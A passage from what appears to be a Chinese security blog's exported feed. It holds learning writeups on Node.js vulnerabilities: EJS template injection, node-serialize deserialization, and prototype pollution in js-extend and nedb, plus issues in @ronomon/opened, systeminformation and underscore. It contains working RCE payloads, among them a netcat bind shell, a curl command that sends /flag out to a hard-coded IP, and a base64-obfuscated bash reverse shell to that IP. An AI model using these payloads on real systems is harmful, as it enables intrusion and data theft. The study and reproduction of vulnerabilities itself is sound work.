<p>稍微跟过去几步，就可以发现已经走到了app.render:</p>
<p><img src="image-20210622164810756.png" alt="image-20210622164810756"></p>
<p>一直跟啊跟，跟到这里的时候发现被赋值为ejs了</p>
<p><img src="image-20210622172902538.png" alt="image-20210622172902538"></p>
<p><img src="image-20210622172845324.png" alt="image-20210622172845324"></p>
<p>之后一堆看不懂的操作，过去之后会读取fliename</p>
<p><img src="image-20210622173725083.png" alt="image-20210622173725083"></p>
<p>接着往下跟，发现开始读取ejs了</p>
<p><img src="image-20210622173759164.png" alt="image-20210622173759164"></p>
<p>找到之后会去找ejs的路径</p>
<p><img src="image-20210622174351435.png" alt="image-20210622174351435"></p>
<p>然后就是把路径转成asci码再转内存里去（大概），一个漫长的过程</p>
<p>找了好半天终于找到了</p>
<p><img src="image-20210622175149375.png" alt="image-20210622175149375"></p>
<p><img src="image-20210622195539013.png" alt="image-20210622195539013"></p>
<p>说实话看到这种东西真的很烦躁。</p>
<p>我要吐了，因为路径没写对👴对着空气调了半天，一直到不了</p>
<p>后来把debug模式关了才发现，把路径改对之后终于看见tryHandleCache了，跟进之后发现有这么一段代码：</p>
<p>跟进到tryHandeCache函数，之后跳过中间哪些部分，再进入到handleCache</p>
<p><img src="image-20210622204441790.png" alt="image-20210622204441790"></p>
<p><img src="image-20210622203030821.png" alt="image-20210622203030821"></p>
<p>我们可以发现outputFunctionName，正常进行函数的话是由导入的时候进行的，而一般来说这个值都是空值。</p>
<p><img src="image-20210622203903154.png" alt="image-20210622203903154"></p>
<p><img src="image-20210622203412682.png" alt="image-20210622203412682"></p>
<p>如果由opts.outputFunctionName的话，我们会立刻执行opt.outputFunctionName.，之后拼接进去，此时我们便会执行了，所以我们应该构造为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">x;<span class="built_in">console</span>.log(<span class="number">1</span>);process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc -lvp 4444 -e /bin/sh&#x27;</span>);x</span><br></pre></td></tr></table></figure>

<p>拼接之后就会变成：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">prepended += <span class="string">&#x27;  var x;console.log(1);process.mainModule.require(&quot;child_process&quot;).exec(&quot;nc -lvp 4444 -e /bin/sh&quot;);x = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这时候就会执行我们的代码了。最后会把我们的代码执行</p>
<p><img src="image-20210622210339432.png" alt="image-20210622210339432"></p>
]]></content>
      <tags>
        <tag>node</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>node反序列化学习</title>
    <url>/2021/06/22/node%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>学习文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;25581847</span><br></pre></td></tr></table></figure>

<p>说是node有反序列化，其实是一个库的反序列化有漏洞 node-serialize</p>
<p>通过审计源码我们可以发现：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">key <span class="keyword">in</span> obj</span>)</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">obj.hasOwnProperty(key)</span>)</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span></span>)</span> &#123;</span><br><span class="line">      obj[key] = <span class="built_in">exports</span>.unserialize(obj[key], originObj);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;string&#x27;</span></span>)</span> &#123;</span><br><span class="line">      <span class="function"><span class="title">if</span>(<span class="params">obj[key].indexOf(FUNCFLAG) === <span class="number">0</span></span>)</span> &#123;</span><br><span class="line">        obj[key] = <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + obj[key].substring(FUNCFLAG.length) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">obj[key].indexOf(CIRCULARFLAG) === <span class="number">0</span></span>)</span> &#123;</span><br><span class="line">        obj[key] = obj[key].substring(CIRCULARFLAG.length);</span><br><span class="line">        circularTasks.push(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>当indexOf(FUNCFLAG) ====0的时候就会执行我们的代码了。并且执行的时候会截取去除掉FUNCFLAG的部分，其实这样就是任意代码执行了，捏个子进程出来</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;whoami &gt;&gt;1&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20210623113823031.png" alt="image-20210623113823031"></p>
<p><img src="image-20210623113843785.png" alt="image-20210623113843785"></p>
<p>但是实际环境下我们可能没有写入的权限，所以尝试把他反弹出来.. </p>
<p>ctf中可以直接这样子：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl http://81.69.201.65:1234/$(cat /flag|base64)&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>反弹shell的话可以这样：</p>
<p>直接执行bash的话我试了老半天发现没发成功也不知道为啥，于是base64一下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;go&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo IGJhc2ggLWkgPiYgL2Rldi90Y3AvODEuNjkuMjAxLjY1LzEyMzQgMD4mMQ==|base64 -d|bash&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>成功getshell</p>
<p><img src="image-20210623115037352.png" alt="image-20210623115037352"></p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>最近的node的漏洞复现</title>
    <url>/2021/06/23/%E6%9C%80%E8%BF%91%E7%9A%84node%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1-ronomon-opened"><a href="#1-ronomon-opened" class="headerlink" title="1. @ronomon/opened"></a>1. @ronomon/opened</h1><p>这个漏洞的原因诞生应该是最简单的哪一类了，官方给了个范例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Opened = <span class="built_in">require</span>(<span class="string">&#x27;@ronomon/opened&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> paths = [<span class="string">&quot;/etc/passwd/$(cat /flag)&quot;</span>];</span><br><span class="line">Opened.files(paths,</span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params">error, hashTable</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">throw</span> error;</span><br><span class="line">    paths.forEach(</span><br><span class="line">      <span class="function"><span class="keyword">function</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(path + <span class="string">&#x27; open=&#x27;</span> + hashTable[path]);</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<p>打个断点，直接就可以看见</p>
<p><img src="image-20210623155443495.png" alt="image-20210623155443495"></p>
<p>作者仅仅是对双引号进行了过滤，其他啥也没管，然后就命令执行，在这种情况下我们可以轻而易举的使用$()绕过。</p>
<p>getshell</p>
<p><img src="image-20210623155648977.png" alt="image-20210623155648977"></p>
<h1 id="2-js-extend"><a href="#2-js-extend" class="headerlink" title="2.js-extend"></a>2.js-extend</h1><p>这个的应该算是很常见的一个原型链污染的了，先整个官方的范例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> extend = <span class="built_in">require</span>(<span class="string">&#x27;js-extend&#x27;</span>).extend</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> obj1 = &#123; <span class="attr">name</span>: <span class="string">&#x27;Jonny&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123; <span class="attr">lastName</span>: <span class="string">&#x27;Quest&#x27;</span> &#125;;</span><br><span class="line"> </span><br><span class="line">extend(obj1, obj2);</span><br><span class="line"><span class="built_in">console</span>.log(obj1);</span><br></pre></td></tr></table></figure>



<p>直接进去撸源码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> extend = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span>) <span class="keyword">throw</span> obj + <span class="string">&#x27; is not an object&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> sources = slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">  each.call(sources, <span class="function"><span class="keyword">function</span>(<span class="params">source</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">source</span>)</span> &#123;</span><br><span class="line">      <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> prop <span class="keyword">in</span> source</span>)</span> &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> source[prop] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; obj[prop]</span>)</span> &#123;</span><br><span class="line">          extend.call(obj, obj[prop], source[prop]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          obj[prop] = source[prop];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>稍微分析一下源码，可以理解为这段源码是怎么组合两个json数据的呢，首先使用slice将整个数组分开来，之后开始循环第二个数组，</p>
<p><img src="image-20210623180117467.png" alt="image-20210623180117467"></p>
<p>其中obj为第一个数组，sources为传入的第二个数组，然后进行遍历，做出来的操作为-》</p>
<p>如果遍历到的sources中的某个键为object，则递归的继续遍历这个数组，如果不是的话就直接将遍历到的key值的属性付给第一个数组。</p>
<p>这两个数组的话：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123; <span class="attr">name</span>: <span class="string">&#x27;Jonny&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123; <span class="attr">lastName</span>: <span class="string">&#x27;Quest&#x27;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>程序会尝试遍历第二个数组，之后将lastName属性赋值给obj1。其中对于obj2的属性名字没有做出任何过滤。在这种情况下，如果obj的数组为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">__proto__</span>:&#123;<span class="attr">add</span>:<span class="string">&quot;123&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>和下面的一段代码是等效的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a = &#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;polluted&#x27;</span>] = &#123;<span class="attr">polluted</span>:<span class="string">&quot;Yes! Its Polluted&quot;</span>&#125;[<span class="string">&#x27;polluted&#x27;</span>]</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.polluted);</span><br></pre></td></tr></table></figure>



<p><img src="image-20210623182923978.png" alt="image-20210623182923978"></p>
<h1 id="3-nedb"><a href="#3-nedb" class="headerlink" title="3.nedb"></a>3.nedb</h1><p>这是一个轻量级的nosql数据库，嵌入式数据库，（其实就是个db文件）</p>
<p>具体使用情况如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> nedb = <span class="built_in">require</span>(<span class="string">&#x27;nedb&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> nedb(&#123;</span><br><span class="line">    filename: <span class="string">&#x27;./data/save.db&#x27;</span>,</span><br><span class="line">    autoload: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这样就会创建一个数据库文件了，插入数据：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.insert(</span><br><span class="line">    [</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&#x27;tom&#x27;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&#x27;jerry&#x27;</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  , <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>查询数据：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.findOne(&#123;</span><br><span class="line">    name: <span class="string">&#x27;tom&#x27;</span></span><br><span class="line">  &#125;, <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(ret);&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20210623200407967.png" alt="image-20210623200407967"></p>
<p>查询的话则需要异步的来进行一个查询</p>
<p><img src="image-20210623200519003.png" alt="image-20210623200519003"></p>
<p>查询多项：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.find(&#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">      $in: [<span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;jerry&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .sort(&#123;</span><br><span class="line">    _id: -<span class="number">1</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .exec(<span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>



<p>如果是查询多项，将会返回一个数组：</p>
<p><img src="image-20210623200635912.png" alt="image-20210623200635912"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.update(&#123;</span><br><span class="line">  _id: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  $set: &#123;</span><br><span class="line">    name: <span class="string">&#x27;kitty&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;);</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>更新某一项</p>
<p>后面的操作都是类似的，就不一一演示了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">db.remove(&#123;</span><br><span class="line">  _id: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;, <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 删除多项</span></span><br><span class="line">db.remove(&#123;</span><br><span class="line">  name: <span class="string">&#x27;kitty&#x27;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  multi: <span class="literal">true</span></span><br><span class="line">&#125;, <span class="function">(<span class="params">err, ret</span>) =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>



<p>其实在这里使用set的时候就隐隐约约感觉不对了，果然是有洞的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Datastore = <span class="built_in">require</span>(<span class="string">&quot;nedb&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> Datastore();</span><br><span class="line">db.insert(&#123;<span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span>&#125;, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    db.update(&#123;<span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span>&#125;, &#123;<span class="attr">$set</span>: &#123;<span class="string">&#x27;__proto__.polluted_1&#x27;</span>: <span class="literal">true</span>&#125;&#125;, &#123;&#125;, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log((&#123;&#125;).polluted_1); <span class="comment">// true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    db.update(&#123;<span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span>&#125;, &#123;<span class="attr">$set</span>: &#123;<span class="string">&#x27;constructor.prototype.polluted_2&#x27;</span>: <span class="literal">true</span>&#125;&#125;, &#123;&#125;, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log((&#123;&#125;).polluted_2); <span class="comment">// true</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>我他妈直接开启F5进去调</p>
<p><img src="image-20210623213316885.png" alt="image-20210623213316885"></p>
<p>发现她的修改原理其实就是push代码..所以就出现了原型链的问题。</p>
<p>感觉这个很适合用于出题。。</p>
<h1 id="4-systeminformation"><a href="#4-systeminformation" class="headerlink" title="4.systeminformation"></a>4.systeminformation</h1><p>版本需求：</p>
<ul>
<li>小于5.6.4</li>
</ul>
<h2 id="si-inetLatency"><a href="#si-inetLatency" class="headerlink" title="si.inetLatency"></a>si.inetLatency</h2><p>老样子，根据范例随便写段东西然后F5开始调</p>
<p><img src="image-20210624101450880.png" alt="image-20210624101450880"></p>
<p>慢慢跟着走，能够发现关键函数：</p>
<p><img src="image-20210624102057003.png" alt="image-20210624102057003"></p>
<p>当我们是linux的时候，就会执行ping指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.019 ms\n64 bytes from 127.0.0.1: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;0.023 ms\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1015ms\nrtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.019&#x2F;0.021&#x2F;0.023&#x2F;0.002 ms\n&#39;</span><br></pre></td></tr></table></figure>



<p>重新下断点，可以看见有一个过滤函数：</p>
<p><img src="image-20210624102326703.png" alt="image-20210624102326703"></p>
<p>原本想试试看数组绕过的，结果发现还有这么一句话：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> host !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (callback) &#123; callback(<span class="literal">null</span>); &#125;</span><br><span class="line">        <span class="keyword">return</span> resolve(<span class="literal">null</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<p>跟进可以发现过滤如下：</p>
<p><img src="image-20210624102338880.png" alt="image-20210624102338880"></p>
<p>感觉这个waf绕不过去，看看github上的提交</p>
<p><img src="image-20210624115015401.png" alt="image-20210624115015401"></p>
<p>可是感觉还是很安全，我没办法绕过这个函数。。。欸，后来又看到一个外国老哥的提交，给了我一些灵感，他是这样写的：</p>
<p><img src="image-20210625210515048.png" alt="image-20210625210515048"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> si = <span class="built_in">require</span>(<span class="string">&#x27;systeminformation&#x27;</span>);</span><br><span class="line">si.versions(&#123;<span class="attr">toString</span> : <span class="function">() =&gt;</span> &#123; <span class="built_in">console</span>.log(<span class="string">&quot;This is a PoC&quot;</span>) &#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>其中提到，对类型的check不够，所以导致可能绕过。其中给出的版本为：小于5.6.11，先试试看——</p>
<p><img src="image-20210625211214086.png" alt="image-20210625211214086"></p>
<p>之后又栽在了这里，感觉很难受啊，这咋办呢。这个提醒了我toString，看看js的toString和PHP的是一个东西吗</p>
<p><img src="image-20210625211316818.png" alt="image-20210625211316818"></p>
<p>emmm</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> test = <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test);;</span><br><span class="line"><span class="built_in">console</span>.log(test.toString());</span><br></pre></td></tr></table></figure>

<p>这个会带有区别</p>
<p><img src="image-20210625212325559.png" alt="image-20210625212325559"></p>
<p>toString就是将一个对象打印出来，但是我们没办法去设定toString的方法，她也不会在我们类被当作字符串处理的时候自动调用，所以还是有区别的。</p>
<h1 id="5-underscore"><a href="#5-underscore" class="headerlink" title="5.underscore"></a>5.underscore</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><a href="https://www.npmjs.org/package/underscore">underscore</a>是 JavaScript 的函数式编程助手库。</p>
<p>此软件包的受影响版本容易受到通过该<code>template</code>函数进行的任意代码注入的攻击，特别是当该<code>variable</code>选项<code>_.templateSettings</code>因未经过清理而被提取时。</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>1.12.0</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;underscore&#x27;</span>);</span><br><span class="line">_.templateSettings.variable = <span class="string">&quot;a = this.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch HELLO&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> t = _.template(<span class="string">&quot;&quot;</span>)();</span><br></pre></td></tr></table></figure>



<h2 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h2><p>先翻一手官方文档，看看正常的情况是怎么用这个函数的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> compiled = _.template(<span class="string">&quot;hello: &lt;%= name %&gt;&quot;</span>);</span><br><span class="line">compiled(&#123;<span class="attr">name</span>: <span class="string">&#x27;moe&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>



<p>官方给出的范例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;underscore&#x27;</span>);</span><br><span class="line"><span class="comment">// _.templateSettings.variable = &quot;a = this.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch HELLO&#x27;)&quot;;</span></span><br><span class="line"><span class="comment">// const t = _.template(&quot;&quot;)();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> compiled = _.template(<span class="string">&quot;hello: &lt;%= name %&gt;&quot;</span>);</span><br><span class="line">b =  compiled(&#123;<span class="attr">name</span>: <span class="string">&#x27;moe&#x27;</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> compiled = _.template(<span class="string">&quot;&lt;% print(&#x27;Hello &#x27; + epithet); %&gt;&quot;</span>);</span><br><span class="line">compiled(&#123;<span class="attr">epithet</span>: <span class="string">&quot;stooge&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>感觉就和ejs很像，这个也是模板渲染函数，不管了走一个F5，单步调几下，很快就可以发现一个可疑的地方：</p>
<p><img src="image-20210624141041637.png" alt="image-20210624141041637"></p>
<p>这里直接new了 Fucntion( settings.variable ),若我们赋值了，则会形成这样的结果：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">a = <span class="built_in">this</span>.process.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;touch HELLO&#x27;</span>),_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//var __t,__p=&#x27;&#x27;,__j=Array.prototype.join,print=function()&#123;__p+=__j.call(arguments,&#x27;&#x27;);&#125;;</span></span><br><span class="line"><span class="comment">//__p+=&#x27;&#x27;;</span></span><br><span class="line"><span class="comment">//return __p;</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>直接造成了代码执行的结果，如果是未给settings.varibale赋值的情况，则是：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">obj,_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line"><span class="function"><span class="title">with</span>(<span class="params">obj||&#123;&#125;</span>)</span>&#123;</span><br><span class="line">__p+=<span class="string">&#x27;hello: &#x27;</span>+</span><br><span class="line">((__t=( name ))==<span class="literal">null</span>?<span class="string">&#x27;&#x27;</span>:__t)+</span><br><span class="line"><span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>这个指令很容易和原型链污染一起被执行，但是我又冒出了一个想法，难道一定要构造这样：</p>
<p> const t = _.template(“”)();</p>
<p>无参数才可以吗，利用官方的实例，我发现果然报错了</p>
<p><img src="image-20210624155655722.png" alt="image-20210624155655722"></p>
<p>跟踪打印之后发现了我的函数变成了这样子的一个情况:</p>
<p><img src="image-20210624162337376.png" alt="image-20210624162337376"></p>
<p>我和正常生成的函数进行一下对比：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">epithet = <span class="built_in">this</span>.process.mainModule.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;touch 1234&#x27;</span>),_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line">__p+=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> print(<span class="string">&#x27;Hello &#x27;</span> + epithet); </span><br><span class="line">__p+=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">anonymous</span>(<span class="params">obj,_</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> __t,__p=<span class="string">&#x27;&#x27;</span>,__j=<span class="built_in">Array</span>.prototype.join,print=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;__p+=__j.call(<span class="built_in">arguments</span>,<span class="string">&#x27;&#x27;</span>);&#125;;</span><br><span class="line"><span class="function"><span class="title">with</span>(<span class="params">obj||&#123;&#125;</span>)</span>&#123;</span><br><span class="line">__p+=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> print(<span class="string">&#x27;Hello &#x27;</span> + epithet); </span><br><span class="line">__p+=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __p;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>发现少了一段with的函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;var __t,__p=&#x27;</span><span class="string">&#x27;,__j=Array.prototype.join,print=function()&#123;__p+=__j.call(arguments,&#x27;</span><span class="string">&#x27;);&#125;;\nwith(obj||&#123;&#125;)&#123;\n__p+=&#x27;</span><span class="string">&#x27;;\n print(&#x27;</span>Hello <span class="string">&#x27; + epithet); \n__p+=&#x27;</span><span class="string">&#x27;;\n&#125;\nreturn __p;\n&#x27;</span></span><br></pre></td></tr></table></figure>



<p>回看之后是在这个语句上添加的：</p>
<p><img src="image-20210624163056355.png" alt="image-20210624163056355"></p>
<p>这就很尴尬了，比较我又不能控制这段函数，只能在再想别的办法了</p>
<p>若无参数形成的函数如下：</p>
